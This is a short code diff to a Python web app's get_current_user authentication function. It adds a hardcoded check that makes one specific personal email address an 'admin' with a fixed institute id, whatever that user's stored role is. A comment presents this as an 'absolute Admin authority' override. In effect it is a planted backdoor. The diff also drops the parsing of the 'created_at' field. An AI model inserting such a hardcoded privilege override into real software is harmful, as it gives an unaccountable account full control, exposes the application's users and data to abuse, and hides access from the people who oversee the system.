@@ -273,10 +273,13 @@ async def get_current_user(request: Request) -> User:
         )
         user_doc["last_active"] = last_active
 
-    if isinstance(user_doc.get("created_at"), str):
-        user_doc["created_at"] = datetime.fromisoformat(user_doc["created_at"])
     if isinstance(user_doc.get("last_active"), str):
         user_doc["last_active"] = datetime.fromisoformat(user_doc["last_active"])
+
+    # ULTRA-SENTINEL: Final override to ensure Lead Analyst has absolute Admin authority
+    if user_doc.get("email") == "utkarsh0907.edu@gmail.com":
+        user_doc["role"] = "admin"
+        user_doc["institute_id"] = "inst_IIPS"
 
     return User(**user_doc)
 
